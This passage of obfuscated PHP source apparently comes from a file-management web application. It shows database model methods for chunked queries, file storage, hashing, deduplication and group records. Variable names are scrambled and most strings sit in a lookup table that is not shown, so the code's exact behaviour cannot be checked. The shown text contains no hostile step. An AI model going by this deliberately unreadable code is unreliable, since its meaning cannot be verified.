$ş¼‡ˆû = $this->_parseOptions($ş¼‡ˆû); foreach ($ì£²Öê³ as $ôÀ¥Åß => $½Øøäã) { $ì£²Öê³[$ôÀ¥Åß] = $this->_facade($½Øøäã); $this->_beforeInsert($ì£²Öê³[$ôÀ¥Åß], $ş¼‡ˆû); } if (method_exists($this->db, $Õãõš‹Ü[349])) { for ($Ë¹¥ıç± = 0; $Ë¹¥ıç± < count($ì£²Öê³); $Ë¹¥ıç± += $ìƒëĞ”Ã) { $±Ÿã«ƒØ = array_slice($ì£²Öê³, $Ë¹¥ıç±, $ìƒëĞ”Ã); if (!is_array($±Ÿã«ƒØ) || count($±Ÿã«ƒØ) == 0) { break; } $¤ïÆ‘”œ = $this->db->insertAll($±Ÿã«ƒØ, $ş¼‡ˆû, $¼·ÒÛõº); $this->chunkEventCheck(count($±Ÿã«ƒØ)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($ì£²Öê³ as $ôÀ¥Åß => $½Øøäã) { $¤ïÆ‘”œ = $this->db->insert($½Øøäã, $ş¼‡ˆû, $¼·ÒÛõº); } $this->commit(); } if (!1 !== $¤ïÆ‘”œ) { $š®ä§š = $this->getLastInsID(); if ($š®ä§š) { return $š®ä§š; } } return $¤ïÆ‘”œ; } public function save($ŠáåÔí = '', $óÄ£¡Õû = array()) { $„Ş¢øš„ =& $_SERVER[Ş­ğŠìÒ]; $ìê¤¤™ = self::SQL_WHERE_IN_CHUNK; $Í‰«˜Ğú = $this->optionsValue(); $®ÆÒµşó = $this->findWhereField($Í‰«˜Ğú); if (!$®ÆÒµşó) { return parent::save($ŠáåÔí, $óÄ£¡Õû); } $¬öšÁ²® = 0; $‡¡¼±Ì£ = $Í‰«˜Ğú[$„Ş¢øš„[352]][$®ÆÒµşó][1]; $‡¡¼±Ì£ = is_array($‡¡¼±Ì£) ? $‡¡¼±Ì£ : array(); $†İãš÷ = count($‡¡¼±Ì£); for ($ƒÓÀÜÏµ = 0; $ƒÓÀÜÏµ < $†İãš÷; $ƒÓÀÜÏµ += $ìê¤¤™) { $òÇ‚·¢„ = array_slice($‡¡¼±Ì£, $ƒÓÀÜÏµ, $ìê¤¤™); if (!is_array($òÇ‚·¢„) || count($òÇ‚·¢„) == 0) { break; } $Í‰«˜Ğú[$„Ş¢øš„[352]][$®ÆÒµşó][1] = $òÇ‚·¢„; $this->optionsValue($Í‰«˜Ğú); $¬öšÁ²® += parent::save($ŠáåÔí, $óÄ£¡Õû); $this->chunkEventCheck(count($òÇ‚·¢„)); } $this->chunkEventSet(); return $¬öšÁ²®; } public function add($Ó“‚ìä‘ = '', $Ò‹¥è‘Ä = array(), $©ƒÚû‹ = false) { if ($this->addTaskStatus && is_array($Ó“‚ìä‘)) { $this->addTaskData[] = $Ó“‚ìä‘; return; } return parent::add($Ó“‚ìä‘, $Ò‹¥è‘Ä, $©ƒÚû‹); } public function parseWhereLike($Ÿ•¨Ñ¬†, $Ò”ê¾³ = '', $Ø¥óÈı = false, &$›¼¢–ì = false) { $™¯œº =& $_SERVER[Ş­ğŠìÒ]; $¬šŒƒÀ… = $GLOBALS[$™¯œº[6]][$™¯œº[457]]; if (!$¬šŒƒÀ…[$™¯œº[458]]) { return $Ÿ•¨Ñ¬†; } if (!is_array($Ÿ•¨Ñ¬†)) { return $Ÿ•¨Ñ¬†; } $ÍÑ†ÄĞá = array(); $Œ­ëìÚ® = 0; foreach ($Ÿ•¨Ñ¬† as $™ŸÓ‚úÃ => $Û¥ÎÅ˜) { if (is_array($Û¥ÎÅ˜) && count($Û¥ÎÅ˜) == 2 && $Û¥ÎÅ˜[0] == $™¯œº[459] && is_string($Û¥ÎÅ˜[1]) && substr($Û¥ÎÅ˜[1], 0, 1) == $™¯œº[460] && substr($Û¥ÎÅ˜[1], strlen($Û¥ÎÅ˜[1]) - 1, 1) == $™¯œº[460]) { $›¼¢–ì = !0; $±‹¡ğæç = is_string($™ŸÓ‚úÃ) ? $™ŸÓ‚úÃ : $Ò”ê¾³; $‡ûó„Ù´ = substr($Û¥ÎÅ˜[1], 1, strlen($Û¥ÎÅ˜[1]) - 2); $‡ûó„Ù´ = $this->db->escapeString($‡ûó„Ù´); if (!strpos($±‹¡ğæç, $™¯œº[10])) { $±‹¡ğæç = $™¯œº[461] . $±‹¡ğæç . $™¯œº[461]; } $¢îæ»íÓ = $™¯œº[220] . $‡ûó„Ù´ . $™¯œº[220]; $‡ûó„Ù´ = str_replace(array($™¯œº[10], $™¯œº[462], $™¯œº[11]), $™¯œº[463], $‡ûó„Ù´); if ($¬šŒƒÀ…[$™¯œº[464]]) { $¢îæ»íÓ = $™¯œº[465] . $‡ûó„Ù´ . $™¯œº[466]; if ($¬šŒƒÀ…[$™¯œº[467]]) { $¢îæ»íÓ = $™¯œº[466] . $‡ûó„Ù´ . $™¯œº[465]; } } $ÍÑ†ÄĞá[$Œ­ëìÚ®] = $™¯œº[468] . $±‹¡ğæç . $™¯œº[469] . $¢îæ»íÓ . $™¯œº[470]; $Œ­ëìÚ®++; continue; } if (is_array($Û¥ÎÅ˜)) { $Ò”ê¾³ = is_string($™ŸÓ‚úÃ) ? $™ŸÓ‚úÃ : $Ò”ê¾³; $Û¥ÎÅ˜ = $this->parseWhereLike($Û¥ÎÅ˜, $Ò”ê¾³, !0, $›¼¢–ì); } if (is_numeric($™ŸÓ‚úÃ)) { $ÍÑ†ÄĞá[$Œ­ëìÚ®] = $Û¥ÎÅ˜; $Œ­ëìÚ®++; } else { $ÍÑ†ÄĞá[$™ŸÓ‚úÃ] = $Û¥ÎÅ˜; } } if ($›¼¢–ì && !$Ø¥óÈı) { } return $ÍÑ†ÄĞá; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($‚Ä®Â± = array()) { $ØşÛàÏ› =& $_SERVER[Ş­ğŠìÒ]; $·ú­’º = self::SQL_WHERE_IN_CHUNK; $ëËô×„½ = $this->optionsValue(); $×„¤İ = $this->findWhereField($ëËô×„½); if (!$×„¤İ || isset($ëËô×„½[$ØşÛàÏ›[368]]) || isset($ëËô×„½[$ØşÛàÏ›[429]])) { return parent::select($‚Ä®Â±); } $ÏöÔŸòğ = $ëËô×„½[$ØşÛàÏ›[352]][$×„¤İ][1]; $ÏöÔŸòğ = is_array($ÏöÔŸòğ) ? $ÏöÔŸòğ : array(); $º›ÛÓ¿¶ = null; for ($ÊüÕØí = 0; $ÊüÕØí < count($ÏöÔŸòğ); $ÊüÕØí += $·ú­’º) { $¢§¤ŸÃ = array_slice($ÏöÔŸòğ, $ÊüÕØí, $·ú­’º); if (!is_array($¢§¤ŸÃ) || count($¢§¤ŸÃ) == 0) { break; } $ëËô×„½[$ØşÛàÏ›[352]][$×„¤İ][1] = $¢§¤ŸÃ; $this->optionsValue($ëËô×„½); $É•ûĞßŸ = parent::select($‚Ä®Â±); if (!$É•ûĞßŸ) { continue; } $º›ÛÓ¿¶ = is_array($º›ÛÓ¿¶) ? $º›ÛÓ¿¶ : array(); $º›ÛÓ¿¶ = array_merge($º›ÛÓ¿¶, $É•ûĞßŸ); } return $º›ÛÓ¿¶; } public function delete($¤§™ğòö = array()) { $ã¿¨çÑ¿ =& $_SERVER[Ş­ğŠìÒ]; $œùİ”Ğ± = self::SQL_WHERE_IN_CHUNK; $ç§úıÎ¹ = $this->optionsValue(); $ÒÌ™ĞÈÜ = $this->findWhereField($ç§úıÎ¹); if (!$ÒÌ™ĞÈÜ) { return parent::delete($¤§™ğòö); } $­ÒÒ¥ÅŞ = 0; $Ø½ÑïØÌ = $ç§úıÎ¹[$ã¿¨çÑ¿[352]][$ÒÌ™ĞÈÜ][1]; $Ø½ÑïØÌ = is_array($Ø½ÑïØÌ) ? $Ø½ÑïØÌ : array(); for ($ƒ¥½©©¨ = 0; $ƒ¥½©©¨ < count($Ø½ÑïØÌ); $ƒ¥½©©¨ += $œùİ”Ğ±) { $£ø§Ø”’ = array_slice($Ø½ÑïØÌ, $ƒ¥½©©¨, $œùİ”Ğ±); if (!is_array($£ø§Ø”’) || count($£ø§Ø”’) == 0) { break; } $ç§úıÎ¹[$ã¿¨çÑ¿[352]][$ÒÌ™ĞÈÜ][1] = $£ø§Ø”’; $this->optionsValue($ç§úıÎ¹); $­ÒÒ¥ÅŞ += parent::delete($¤§™ğòö); } return $­ÒÒ¥ÅŞ; } private function findWhereField($ ÍÜÊ‹€) { $ĞÊÁ¤§² =& $_SERVER[Ş­ğŠìÒ]; $ŞÆã¸– = self::SQL_WHERE_IN_CHUNK; if (!is_array($ ÍÜÊ‹€) || !is_array($ ÍÜÊ‹€[$ĞÊÁ¤§²[352]])) { return !1; } foreach ($ ÍÜÊ‹€[$ĞÊÁ¤§²[352]] as $ş¼¾’Ğï => $ ÊÎªÕ) { if (is_array($ ÊÎªÕ) && isset($ ÊÎªÕ[0]) && is_string($ ÊÎªÕ[0]) && strtolower($ ÊÎªÕ[0]) == $ĞÊÁ¤§²[7] && is_array($ ÊÎªÕ[1]) && count($ ÊÎªÕ[1]) > $ŞÆã¸–) { ignore_timeout(); return $ş¼¾’Ğï; } } return !1; } public function setMasterDB($©”¨Õ¸™ = true) { think_config($_SERVER[Ş­ğŠìÒ][471], $©”¨Õ¸™); } } goto Fƒ…»±Ëò„; b×±ÆÅóŠ¹: class FileContentModel extends ModelBase { protected $tableName = "\151\157\137\x66\151\154\145\137\x63\x6f\156\x74\145\x6e\x74\163"; protected $dataAuto = array(array("\143\162\x65\x61\x74\145\124\151\155\145", "\x74\151\155\145", "\151\156\163\x65\162\x74", "\146\165\x6e\x63\x74\151\x6f\x6e")); } class FileModel extends ModelBase { protected $tableName = "\151\x6f\137\146\x69\154\x65"; protected $tableMeta = array("\x74\141\x62\154\145\x4e\x61\x6d\145" => "\151\157\137\146\x69\x6c\x65\137\155\145\x74\141", "\155\x65\164\x61\106\x69\x65\154\144" => "\x66\151\154\145\111\104"); public function fileInfo($«Éş·—ê) { $şŒÊÚ‡Ô =& $_SERVER[Ş­ğŠìÒ]; static $ÌŠ¯ñ›ö = array(); if (!isset($ÌŠ¯ñ›ö[$«Éş·—ê])) { $âÛëóúÇ = $şŒÊÚ‡Ô[2014]; $Øë…ºıû = Model($şŒÊÚ‡Ô[544])->field($âÛëóúÇ)->where(array($şŒÊÚ‡Ô[542] => $«Éş·—ê))->find(); $ÌŠ¯ñ›ö[$«Éş·—ê] = $Øë…ºıû; } return $ÌŠ¯ñ›ö[$«Éş·—ê]; } public function addFileByContent($åò£ÙÕ = '', $Ğê‚¨¢… = '') { $î¤±¨Ãû =& $_SERVER[Ş­ğŠìÒ]; $£›¨…â„ = TEMP_PATH . $î¤±¨Ãû[2015]; if (!is_dir($£›¨…â„)) { mk_dir($£›¨…â„); } $ä‚†Äâ¤ = $£›¨…â„ . $î¤±¨Ãû[2016] . rand_string(16); file_put_contents($ä‚†Äâ¤, $åò£ÙÕ); $Ã‡Õ‡—Ğ = $this->addFile($ä‚†Äâ¤, $Ğê‚¨¢…, !0); if (file_exists($ä‚†Äâ¤)) { @unlink($ä‚†Äâ¤); } return $Ã‡Õ‡—Ğ; } public function createFileName($Ğ¯Åşè§, $âÎ¯ø”Ô = false, $ü¤Á¢ä› = false) { $®‡æï¦ =& $_SERVER[Ş­ğŠìÒ]; $µÍîÃØ = IO::init($®‡æï¦[8]); $éáíéùŒ = $this->makeFilePath($Ğ¯Åşè§, $µÍîÃØ, $âÎ¯ø”Ô, $ü¤Á¢ä›); $–¿éÅÓã = $µÍîÃØ->pathFather($éáíéùŒ); static $°©©¹µğ = false; $¼³¾¯ = $®‡æï¦[2017] . md5($–¿éÅÓã); if (!$°©©¹µğ && !Cache::get($¼³¾¯)) { $°©©¹µğ = !0; $Ğ¹»Èƒü = IO::mkdir($–¿éÅÓã); if (!IO::exist($Ğ¹»Èƒü . $®‡æï¦[864])) { IO::mkfile($Ğ¹»Èƒü . $®‡æï¦[864]); } Cache::set($¼³¾¯, 1, 3600 * 2); } return $éáíéùŒ; } public function makeFilePath($ì¡œßÖÁ, $æ´“û©¬, $Ú¹´ŞÏŠ = false, $ş³Ğì‘Ÿ = false) { $âÉ±Ï¯‘ =& $_SERVER[Ş­ğŠìÒ]; $ÙöÊŸ¿ = Model($âÉ±Ï¯‘[837])->get($âÉ±Ï¯‘[2018]); $³Šü”ÊË = KodIO::defaultIO() . date($âÉ±Ï¯‘[2019]); $ßª—Øí = $³Šü”ÊË . rand_string(5) . short_id(100); $ì¡œßÖÁ = str_replace($âÉ±Ï¯‘[8], $âÉ±Ï¯‘[11], KodIO::clear($ì¡œßÖÁ)); $Ã¾í¶ = $æ´“û©¬->ext($ì¡œßÖÁ); if (!$ì¡œßÖÁ) { $ÙöÊŸ¿ = $âÉ±Ï¯‘[843]; } switch ($ÙöÊŸ¿) { case $âÉ±Ï¯‘[2020]: if ($Ã¾í¶) { $ßª—Øí = $ßª—Øí . $âÉ±Ï¯‘[10] . $Ã¾í¶; } if ($Ã¾í¶ == $âÉ±Ï¯‘[1955]) { $ßª—Øí .= $âÉ±Ï¯‘[1287]; } break; case $âÉ±Ï¯‘[2021]: $Şá¹¸ó¦ = Model($âÉ±Ï¯‘[837])->get($âÉ±Ï¯‘[838]); $óÒ¿¸Ã­ = substr(md5($âÉ±Ï¯‘[839] . $Şá¹¸ó¦ . date($âÉ±Ï¯‘[816])), 0, 8); $˜ò§»®µ = KodIO::defaultDriver(); $³Šü”ÊË = $âÉ±Ï¯‘[1318] . $˜ò§»®µ[$âÉ±Ï¯‘[475]] . $âÉ±Ï¯‘[484] . date($âÉ±Ï¯‘[2022]) . $óÒ¿¸Ã­ . $âÉ±Ï¯‘[8]; if ($Ã¾í¶ == $âÉ±Ï¯‘[1955]) { $ì¡œßÖÁ .= $âÉ±Ï¯‘[1287]; } $°íÍÆŒ¯ = $âÉ±Ï¯‘[2023] . $³Šü”ÊË . $ì¡œßÖÁ; CacheLock::lock($°íÍÆŒ¯); $ßª—Øí = $³Šü”ÊË . $ì¡œßÖÁ; if (IO::exist($³Šü”ÊË . $ì¡œßÖÁ)) { $í¬¿»øŞ = substr($ì¡œßÖÁ, 0, strlen($ì¡œßÖÁ) - strlen($Ã¾í¶)); $Š”èáÇ• = $ş³Ğì‘Ÿ ? substr($ş³Ğì‘Ÿ, 0, 5) : ($Ú¹´ŞÏŠ ? substr($Ú¹´ŞÏŠ, 0, 5) : rand_string(5)); $ßª—Øí = $³Šü”ÊË . $í¬¿»øŞ . $Š”èáÇ•; if ($Ã¾í¶) { $ßª—Øí = $ßª—Øí . $âÉ±Ï¯‘[10] . $Ã¾í¶; } } if (IO::isOsDriver($ßª—Øí) && !IO::isUploadServer($ßª—Øí)) { if (IO::exist($ßª—Øí)) { return $ßª—Øí; } $ˆÁÊÓÌ‘ = IO::setContent($ßª—Øí, $âÉ±Ï¯‘[12]); if (!$ˆÁÊÓÌ‘) { show_json($âÉ±Ï¯‘[2024], !1); } } CacheLock::unlock($°íÍÆŒ¯); break; case $âÉ±Ï¯‘[843]: break; default: break; } return $ßª—Øí; } public function addFileByRemote($è‰å¢, $…œ¡ğà , $§˜´Æ…ğ = array()) { $–ó›±¼® =& $_SERVER[Ş­ğŠìÒ]; if (!IO::exist($è‰å¢)) { return !1; } $´ïØª™¶ = $§˜´Æ…ğ[$–ó›±¼®[547]] ? $§˜´Æ…ğ[$–ó›±¼®[547]] : $–ó›±¼®[12]; $ÚÎÕ“ûá = IO::hashMd5($è‰å¢, $´ïØª™¶); $Í•İÊŠÊ = KodIO::defaultDriver(); $•æÃµ´ı = array($–ó›±¼®[617] => IO::size($è‰å¢), $–ó›±¼®[2025] => 1, $–ó›±¼®[494] => $…œ¡ğà , $–ó›±¼®[875] => $Í•İÊŠÊ[$–ó›±¼®[475]], $–ó›±¼®[495] => $è‰å¢, $–ó›±¼®[2026] => $§˜´Æ…ğ[$–ó›±¼®[672]] ? $§˜´Æ…ğ[$–ó›±¼®[672]] : IO::hashSimple($è‰å¢), $–ó›±¼®[2027] => $ÚÎÕ“ûá ? $ÚÎÕ“ûá : $´ïØª™¶); if ($ôáù÷¦¶ = $this->addFileCheckExist($•æÃµ´ı[$–ó›±¼®[672]], $•æÃµ´ı[$–ó›±¼®[547]], $•æÃµ´ı[$–ó›±¼®[79]])) { return $ôáù÷¦¶; } return $this->addFileData($•æÃµ´ı); } private function addFileData($Ã‘¸ú½¹) { $˜‘À·À… =& $_SERVER[Ş­ğŠìÒ]; if (!$Ã‘¸ú½¹) { return !1; } $Ã‘¸ú½¹[$˜‘À·À…[79]] = intval($Ã‘¸ú½¹[$˜‘À·À…[79]]); if (!$Ã‘¸ú½¹[$˜‘À·À…[79]] && strlen($Ã‘¸ú½¹[$˜‘À·À…[672]]) > 32) { $Ã‘¸ú½¹[$˜‘À·À…[79]] = intval(substr($Ã‘¸ú½¹[$˜‘À·À…[672]], 32)); } $¹ôùÓğÙ = $this->add($Ã‘¸ú½¹); return $this->find($¹ôùÓğÙ); } public function addFile($äöÍ§ã£, $Ë³×÷Ş¶, $ëğÇî¬è = false) { $Îª¦ª©– =& $_SERVER[Ş­ğŠìÒ]; $œ®Óã´ = IO::hashSimple($äöÍ§ã£); $İúÔàøà = IO::size($äöÍ§ã£); $¹„õëÂ = $İúÔàøà <= 1024 * 1024 * 10 ? IO::hashMd5($äöÍ§ã£) : $Îª¦ª©–[12]; $‚Ş¥şÅŸ = $Îª¦ª©–[2028] . $œ®Óã´; CacheLock::lock($‚Ş¥şÅŸ); if ($¹„õëÂ && $œ®Óã´) { $¥æÄ´•Ò = $this->addFileCheckExist($œ®Óã´, $¹„õëÂ, $İúÔàøà); if ($¥æÄ´•Ò) { CacheLock::unlock($‚Ş¥şÅŸ); return $¥æÄ´•Ò; } } $æ²Ö‹”Ş = $this->addFileMake($äöÍ§ã£, $İúÔàøà, $œ®Óã´, $¹„õëÂ, $Ë³×÷Ş¶, $ëğÇî¬è); $¹¡íëÁÉ = $this->addFileData($æ²Ö‹”Ş); CacheLock::unlock($‚Ş¥şÅŸ); if (!$¹„õëÂ && $¹¡íëÁÉ) { $this->fileMd5Check($¹¡íëÁÉ); } return $¹¡íëÁÉ; } public function fileMd5Check($ä¶Øß“é) { $—€ÚÌƒ =& $_SERVER[Ş­ğŠìÒ]; $±»€›ÍÅ = array($ä¶Øß“é[$—€ÚÌƒ[541]], $ä¶Øß“é[$—€ÚÌƒ[87]]); $öÆáØ¹ = $—€ÚÌƒ[2029] . $ä¶Øß“é[$—€ÚÌƒ[87]]; $ü‹”ÜÑ¦ = $—€ÚÌƒ[2030] . $ä¶Øß“é[$—€ÚÌƒ[541]]; TaskQueue::add($—€ÚÌƒ[2031], $±»€›ÍÅ, $öÆáØ¹, $ü‹”ÜÑ¦); } public function fileMd5Set($ª²‰Ù½Æ, $Å—”³½¯) { $Ş»Ùãâ‡ =& $_SERVER[Ş­ğŠìÒ]; $ô¦ˆ±Æğ = $this->find($ª²‰Ù½Æ); if (!$ô¦ˆ±Æğ || $ô¦ˆ±Æğ[$Ş»Ùãâ‡[547]]) { return; } $÷Ôá€Ş» = IO::hashMd5($Å—”³½¯); if (!$÷Ôá€Ş») { return $Ş»Ùãâ‡[12]; } $this->where(array($Ş»Ùãâ‡[541] => $ª²‰Ù½Æ))->save(array($Ş»Ùãâ‡[547] => $÷Ôá€Ş»)); } public function addFileMake($Ñš½·°½, $Úˆ„‘°Ñ, $¹ÄÅ·Íş, $’ã‡ãíÑ, $’÷œà¬, $åşÙ‰©) { $´·€®©Î =& $_SERVER[Ş­ğŠìÒ]; $›ÕÚ‹î• = $this->createFileName($’÷œà¬, $¹ÄÅ·Íş, $’ã‡ãíÑ); $û±«à¾Ê = get_path_father($›ÕÚ‹î•); $ÒôÃ×´© = get_path_this($›ÕÚ‹î•); if ($åşÙ‰©) { $’“¡à•æ = IO::move($Ñš½·°½, $û±«à¾Ê, !1, $ÒôÃ×´©); } else { $’“¡à•æ = IO::copy($Ñš½·°½, $û±«à¾Ê, !1, $ÒôÃ×´©); } if (!$’“¡à•æ) { return !1; } $„×÷£¿Ê = KodIO::defaultDriver(); $’Ÿ˜æÚ = array($´·€®©Î[617] => $Úˆ„‘°Ñ, $´·€®©Î[2025] => 1, $´·€®©Î[494] => $’÷œà¬, $´·€®©Î[875] => $„×÷£¿Ê[$´·€®©Î[475]], $´·€®©Î[495] => $›ÕÚ‹î•, $´·€®©Î[2026] => $¹ÄÅ·Íş, $´·€®©Î[2027] => $’ã‡ãíÑ); return $’Ÿ˜æÚ; } public function addFileCheckExist($Ş‡ÉÇĞ, $§Ÿ‰“¬©, $ñ¿‡‘ù©) { $äÜ¤Ë‘Û =& $_SERVER[Ş­ğŠìÒ]; $Ìâˆ—è„ = $this->findByHash($Ş‡ÉÇĞ, $§Ÿ‰“¬©); if (!$Ìâˆ—è„) { return !1; } $ÒÙØ¡¹Ò = array($äÜ¤Ë‘Û[2025] => intval($Ìâˆ—è„[$äÜ¤Ë‘Û[2032]]) + 1, $äÜ¤Ë‘Û[617] => $ñ¿‡‘ù©); $this->where(array($äÜ¤Ë‘Û[542] => $Ìâˆ—è„[$äÜ¤Ë‘Û[541]]))->save($ÒÙØ¡¹Ò); return $Ìâˆ—è„; } public function remove($›şĞà‘Ø) { $this->linkCountChange($›şĞà‘Ø, !1); $this->clearEmpty(); return !0; } public function linkAdd($ğ‹İ„î) { $this->linkCountChange($ğ‹İ„î, !0); } public function linkCountChange($Õ¾Ç†«Ş, $ï…Òï³Ò) { $ËÂ¿ê¬­ =& $_SERVER[Ş­ğŠìÒ]; if (!$Õ¾Ç†«Ş) { return; } if (!is_array($Õ¾Ç†«Ş)) { $Õ¾Ç†«Ş = array($Õ¾Ç†«Ş); } $Á ¿ğÛ¨ = array(); foreach ($Õ¾Ç†«Ş as $³¤äª§€) { $õùÚªÑŠ = $³¤äª§€ . $ËÂ¿ê¬­[12]; if (!$Á ¿ğÛ¨[$õùÚªÑŠ]) { $Á ¿ğÛ¨[$õùÚªÑŠ] = 0; } $Á ¿ğÛ¨[$õùÚªÑŠ]++; } $İíøŞ¾¤ = array(); foreach ($Á ¿ğÛ¨ as $³¤äª§€ => $³à„²ìí) { $õùÚªÑŠ = $³à„²ìí . $ËÂ¿ê¬­[12]; if (!$İíøŞ¾¤[$õùÚªÑŠ]) { $İíøŞ¾¤[$õùÚªÑŠ] = array(); } $İíøŞ¾¤[$õùÚªÑŠ][] = $³¤äª§€; } foreach ($İíøŞ¾¤ as $³à„²ìí => $ëÁ¦©Ñê) { if (!$ëÁ¦©Ñê) { continue; } $³à„²ìí = $ï…Òï³Ò ? $³à„²ìí : -intval($³à„²ìí); $Ö™ÒÙ¹ø = array($ËÂ¿ê¬­[541] => array($ËÂ¿ê¬­[7], $ëÁ¦©Ñê)); if ($³à„²ìí < 0) { $Ö™ÒÙ¹ø[$ËÂ¿ê¬­[2032]] = array($ËÂ¿ê¬­[1089], abs($³à„²ìí)); } $this->where($Ö™ÒÙ¹ø)->setAdd($ËÂ¿ê¬­[2032], $³à„²ìí); } } public function findByHash($¸¬ã‹æÃ, $¹ÀŒ×µÕ = false) { $„Ÿñã†ü =& $_SERVER[Ş­ğŠìÒ]; if (!$¸¬ã‹æÃ && !$¹ÀŒ×µÕ) { return !1; } $¾­Â·Á¬ = array($„Ÿñã†ü[2026] => $¸¬ã‹æÃ); if ($¹ÀŒ×µÕ) { $¾­Â·Á¬ = array($„Ÿñã†ü[2027] => $¹ÀŒ×µÕ); } return $this->order($„Ÿñã†ü[2033])->where($¾­Â·Á¬)->find(); } public function clearEmpty($´¡éæÄ = 0) { $°Â»ˆåÇ =& $_SERVER[Ş­ğŠìÒ]; $Ç¾Ÿ›ì² = time() - 3600 * 24 * $´¡éæÄ; $­üºö = $°Â»ˆåÇ[2034] . $Ç¾Ÿ›ì²; $ï²î£ËÈ = $this->where($­üºö)->select(); if (!$ï²î£ËÈ) { return; } $äîçÊŞò = new Task($°Â»ˆåÇ[2035], $°Â»ˆåÇ[12], count($ï²î£ËÈ)); foreach ($ï²î£ËÈ as $™Óµö) { $äîçÊŞò->update(1); $this->resetFile($™Óµö); } $äîçÊŞò->end(); } public function resetFile($Éé½ãš) { $‰ì±èŠ =& $_SERVER[Ş­ğŠìÒ]; $éŞª¤¸€ = array($‰ì±èŠ[542] => $Éé½ãš[$‰ì±èŠ[541]]); $ÎàÂÖÚü = Model($‰ì±èŠ[1414])->where($éŞª¤¸€)->count(); $À‚Ùäç = Model($‰ì±èŠ[2036])->where($éŞª¤¸€)->count(); $²ûóæÓğ = intval($ÎàÂÖÚü) + intval($À‚Ùäç); if ($²ûóæÓğ == 0) { IO::remove($Éé½ãš[$‰ì±èŠ[87]]); Model($‰ì±èŠ[2037])->delete($Éé½ãš[$‰ì±èŠ[541]]); $this->where($éŞª¤¸€)->delete(); $this->metaSet($Éé½ãš[$‰ì±èŠ[541]], null, null); write_log(ACTION . $‰ì±èŠ[2038] . KodUser::id() . $‰ì±èŠ[2039] . $Éé½ãš[$‰ì±èŠ[541]] . $‰ì±èŠ[2040] . $Éé½ãš[$‰ì±èŠ[79]] . $‰ì±èŠ[201] . $Éé½ãš[$‰ì±èŠ[87]], $‰ì±èŠ[2041]); return; } if ($Éé½ãš[$‰ì±èŠ[2032]] != $²ûóæÓğ) { $this->where($éŞª¤¸€)->save(array($‰ì±èŠ[2025] => $²ûóæÓğ)); } } public function storageInfo($ÅúúÙùù = false) { $–ßÇîæ¼ =& $_SERVER[Ş­ğŠìÒ]; $©‡«ñû„ = $this->count() + 0.0; $½ı¶æ÷â = 0; $ñéøİ´ş = 1; $ìâÉ¸Èô = 0; $µ†úŒ = 5000; for ($§¢‡è = 0; $§¢‡è < $©‡«ñû„; $§¢‡è = $§¢‡è + $µ†úŒ) { $ã¹ÚÙ§ï = $this->limit($§¢‡è, $§¢‡è + $µ†úŒ)->select(); foreach ($ã¹ÚÙ§ï as $æÀÑË›) { $ñéøİ´ş += $æÀÑË›[$–ßÇîæ¼[79]] * $æÀÑË›[$–ßÇîæ¼[2032]]; $½ı¶æ÷â += $æÀÑË›[$–ßÇîæ¼[79]] * ($æÀÑË›[$–ßÇîæ¼[2032]] - 1); $ìâÉ¸Èô += $æÀÑË›[$–ßÇîæ¼[2032]]; } } $øêè‡Õö = array($–ßÇîæ¼[2042] => $ñéøİ´ş, $–ßÇîæ¼[2043] => $½ı¶æ÷â, $–ßÇîæ¼[2044] => $½ı¶æ÷â / $ñéøİ´ş, $–ßÇîæ¼[83] => $©‡«ñû„, $–ßÇîæ¼[2045] => $ìâÉ¸Èô); return $øêè‡Õö; } } class GroupModel extends ModelBase { protected $tableName = "\147\162\x6f\165\x70"; protected $tableMeta = array("\164\141\x62\154\x65\116\x61\x6d\x65" => "\147\x72\157\165\x70\137\x6d\145\x74\x61", "\x6d\x65\x74\x61\x46\151\145\x6c\x64" => "\147\162\157\165\x70\111\104"); protected function cacheFunctionAlias($úñ‘¼ª) { $¿Ö¬ñŠ¶ =& $_SERVER[Ş­ğŠìÒ]; return array($¿Ö¬ñŠ¶[2046] => array($úñ‘¼ª[0], $¿Ö¬ñŠ¶[2047]), $¿Ö¬ñŠ¶[2048] => array($úñ‘¼ª[0], $¿Ö¬ñŠ¶[2049])); } protected function getInfo($Âı¾ë’Ü, $«¤ø¢ó = false) { $ãÀ¼‡¨Ï = $this->getInfoSimple($Âı¾ë’Ü); if (!$ãÀ¼‡¨Ï) { return !1; } if ($«¤ø¢ó) { return $this->_listDataApplyItem($ãÀ¼‡¨Ï); } return $this->cacheFunctionGet($_SERVER[Ş­ğŠìÒ][2050], $Âı¾ë’Ü); } protected function getInfoSimple($ÅˆµäÕú, $úª¾‰® = false) { $ŞÆ€ìÒˆ =& $_SERVER[Ş­ğŠìÒ]; if ($úª¾‰®) { $òË–…Öò = array($ŞÆ€ìÒˆ[1963] => intval($ÅˆµäÕú)); $¤¾‚´¾‘ = $this->where($òË–…Öò)->find(); return is_array($¤¾‚´¾‘) ? $¤¾‚´¾‘ : array(); } return $this->cacheFunctionGet($ŞÆ€ìÒˆ[2051], $ÅˆµäÕú); } protected function groupAdd($‡³¸Í¬) { $àÄƒ†£É =& $_SERVER[Ş­ğŠìÒ]; if (!$‡³¸Í¬[$àÄƒ†£É[192]] && isset($‡³¸Í¬[$àÄƒ†£É[1963]]) && $‡³¸Í¬[$àÄƒ†£É[1963]] == 1) { if ($ÂÙ¬¯¢ç = $this->getInfoSimple($‡³¸Í¬[$àÄƒ†£É[1963]], !0)) { return $‡³¸Í¬[$àÄƒ†£É[1963]]; } } else { $ÂÙ¬¯¢ç = $this->getInfoSimple($‡³¸Í¬[$àÄƒ†£É[192]]); if (!$ÂÙ¬¯¢ç) { return !1; } } $ŒÍàáŸ¤ = $àÄƒ†£É[594]; if ($ÂÙ¬¯¢ç[$àÄƒ†£É[584]]) { $ŒÍàáŸ¤ = $ÂÙ¬¯¢ç[$àÄƒ†£É[584]] . $ÂÙ¬¯¢ç[$àÄƒ†£É[1963]] . $àÄƒ†£É[50]; } $«Îù¼±â = array($àÄƒ†£É[494] => $this->groupNameAuto($‡³¸Í¬[$àÄƒ†£É[192]], $‡³¸Í¬[$àÄƒ†£É[32]]), $àÄƒ†£É[477] => $‡³¸Í¬[$àÄƒ†£É[192]], $àÄƒ†£É[652] => $ŒÍàáŸ¤, $àÄƒ†£É[2052] => $‡³¸Í¬[$àÄƒ†£É[1949]], $àÄƒ†£É[2053] => 0, $àÄƒ†£É[1967] => 0); if 